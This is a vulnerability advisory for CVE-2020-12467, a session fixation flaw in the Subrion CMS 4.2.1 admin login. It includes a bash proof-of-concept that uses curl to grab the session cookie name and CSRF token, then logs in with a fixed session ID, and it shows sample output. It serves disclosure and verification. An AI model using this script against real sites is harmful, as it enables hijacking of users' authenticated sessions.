---
layout: default
parent: Subrion CMS
title: CVE-2020-12467 - Session Fixation 
nav_order: 1
---
# Admin/User Login - Session Fixation

## VulDB-Like Summary

A vulnerability has been found in the Subrion CMS 4.2.1. It has been rated as problematic. Affected by this issue is an unknown code. The manipulation of the session cookie with an arbitrary alphanumeric value prior to the login leads to a session fixation vulnerability. Using CWE to declare the problem leads to CWE-384. Impacted is integrity. An attacker might be able hijacking the user-validated session by forcing an arbitrary session ID.

The weakness was presented 04/12/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-XXXX. The attack may be launched remotely. No form of authentication is required for exploitation. Technical details are known but no exploit is publicly available.

## Proof-of-Concept

**Sample affected URL**

* http://subrion.local/panel/

Submitting a valid login with a crafted session ID, causes the ID to be reflected and set as a valid session identifier.

The following [script](https://github.com/belong2yourself/vulnerabilities/blob/master/docs/Subrion%20CMS/Session%20Fixation/sess_fix.sh) may be used to easily verify the vulnerability:

```bash
#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"

# Grep Session Cookie Name
sess_cookie_name=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*")
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Fix the Session Cookie Value and login
curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "Cookie: loader=loaded; $sess_cookie_name=00000000000000000000000000" -i | grep "Set-Cookie"

```

Using the above script should give the following output, proving the vulnerability.

```
$ ./sess_fix.sh
Set-Cookie: INTELLI_06c8042c3d=00000000000000000000000000; expires=Sun, 12-Apr-2020 16:07:44 GMT; Max-Age=1800; path=/
Set-Cookie: salt=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT; Max-Age=0; path=/
```


## Remediation

Currently, no fixes are available for this issue.

## References

*   [https://owasp.org/www-community/attacks/Session_fixation](https://owasp.org/www-community/attacks/Session_fixation)



 
